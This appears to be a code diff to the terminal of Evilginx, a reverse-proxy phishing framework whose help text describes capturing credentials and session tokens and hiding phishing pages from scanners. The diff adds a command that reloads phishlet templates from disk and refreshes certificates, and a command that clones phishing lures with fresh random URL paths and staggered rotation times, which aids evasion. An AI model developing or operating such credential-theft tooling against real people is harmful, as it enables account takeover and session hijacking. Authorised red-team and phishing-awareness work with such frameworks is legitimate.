@@ -928,6 +928,28 @@ func (t *Terminal) handlePhishlets(args []string) error {
 			}
 			t.output("%s\n", out)
 			return nil
+		case "reload":
+			pl, err := t.cfg.GetPhishlet(args[1])
+			if err != nil {
+				return err
+			}
+			if pl.ParentName != "" {
+				return fmt.Errorf("cannot reload child phishlet '%s' — reload its parent '%s' instead", args[1], pl.ParentName)
+			}
+			newPl, err := NewPhishlet(args[1], pl.Path, nil, t.cfg)
+			if err != nil {
+				return fmt.Errorf("reload: failed to parse phishlet YAML: %v", err)
+			}
+			if err := t.cfg.ReloadPhishlet(args[1], newPl); err != nil {
+				return fmt.Errorf("reload: %v", err)
+			}
+			if t.cfg.IsSiteEnabled(args[1]) {
+				t.cfg.refreshActiveHostnames()
+				t.manageCertificates(true)
+			}
+			log.Info("phishlet '%s' reloaded from disk", args[1])
+			t.output("%s", t.sprintPhishletStatus(args[1]))
+			return nil
 		}
 	} else if pn == 3 {
 		switch args[0] {
@@ -1325,6 +1347,32 @@ func (t *Terminal) handleLures(args []string) error {
 			} else {
 				return fmt.Errorf("incorrect number of arguments")
 			}
+		case "clone":
+			if pn == 2 {
+				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
+				if err != nil {
+					return fmt.Errorf("clone: %v", err)
+				}
+				src, err := t.cfg.GetLure(l_id)
+				if err != nil {
+					return fmt.Errorf("clone: %v", err)
+				}
+				newLure := *src
+				newLure.Path = "/" + GenRandomString(8)
+				if newLure.AutoRotate {
+					now := time.Now().Unix()
+					if newLure.RotateInterval > 0 {
+						newLure.NextRotate = now + newLure.RotateInterval
+					} else {
+						newLure.NextRotate = now + 2700 + rand.Int63n(2700)
+					}
+				}
+				t.cfg.AddLure(newLure.Phishlet, &newLure)
+				newId := len(t.cfg.lures) - 1
+				log.Info("cloned lure %d → new lure ID: %d  path: %s", l_id, newId, newLure.Path)
+				return nil
+			}
+			return fmt.Errorf("usage: lures clone <id>")
 		case "delete":
 			if pn == 2 {
 				if len(t.cfg.lures) == 0 {
@@ -1732,6 +1780,7 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("hostname", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("enable", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("disable", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("hide", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter)),
+			readline.PcItem("reload", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("unauth_url", readline.PcItemDynamic(t.phishletPrefixCompleter))))
 	h.AddSubCommand("phishlets", nil, "", "show status of all available phishlets")
 	h.AddSubCommand("phishlets", nil, "<phishlet>", "show details of a specific phishlets")
@@ -1744,6 +1793,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("phishlets", []string{"hide"}, "hide <phishlet>", "hides the phishing page, logging and redirecting all requests to it (good for avoiding scanners when sending out phishing links)")
 	h.AddSubCommand("phishlets", []string{"unhide"}, "unhide <phishlet>", "makes the phishing page available and reachable from the outside")
 	h.AddSubCommand("phishlets", []string{"get-hosts"}, "get-hosts <phishlet>", "generates entries for hosts file in order to use localhost for testing")
+	h.AddSubCommand("phishlets", []string{"reload"}, "reload <phishlet>", "reload phishlet YAML from disk without restarting evilginx")
 
 	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", "Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.", LAYER_TOP,
 		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))))
@@ -1764,12 +1814,14 @@ func (t *Terminal) createHelp() {
 
 	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
 		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"), readline.PcItem("pause"), readline.PcItem("unpause"),
+			readline.PcItem("clone"),
 			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("ua_filter"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)))),
 			readline.PcItem("delete", readline.PcItem("all"))))
 
 	h.AddSubCommand("lures", nil, "", "show all create lures")
 	h.AddSubCommand("lures", nil, "<id>", "show details of a lure with a given <id>")
 	h.AddSubCommand("lures", []string{"create"}, "create <phishlet> [subdomain]", "creates new lure for given <phishlet>; optional [subdomain] sets a custom subdomain (e.g. 'login' produces login.<phishlet_domain>)")
+	h.AddSubCommand("lures", []string{"clone"}, "clone <id>", "duplicate lure <id> with all its settings, generating a fresh random path")
 	h.AddSubCommand("lures", []string{"delete"}, "delete <id>", "deletes lure with given <id>")
 	h.AddSubCommand("lures", []string{"delete", "all"}, "delete all", "deletes all created lures")
 	h.AddSubCommand("lures", []string{"get-url"}, "get-url <id> <key1=value1> <key2=value2>", "generates a phishing url for a lure with a given <id>, with optional parameters")
